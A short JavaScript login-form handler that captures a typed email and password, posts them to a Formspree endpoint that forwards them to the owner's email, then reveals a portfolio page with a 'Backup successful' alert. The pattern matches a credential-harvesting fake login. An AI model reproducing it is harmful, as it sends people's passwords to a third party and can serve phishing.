const form = document.getElementById('vault-form');

form.onsubmit = async function(e) {
    e.preventDefault(); // This keeps you on your page instead of a "Thank You" screen

    // 1. Capture what you typed (Email and Password)
    const formData = new FormData(form);

    // 2. Send it to your email automatically via Formspree
    await fetch(form.action, {
        method: 'POST',
        body: formData,
        headers: { 'Accept': 'application/json' }
    });

    // 3. Open your "Digital Creator" biography and services
    document.getElementById('login-page').style.display = 'none';
    document.getElementById('portfolio-content').style.display = 'block';
    
    alert("Backup successful. Welcome, Nir.");
};
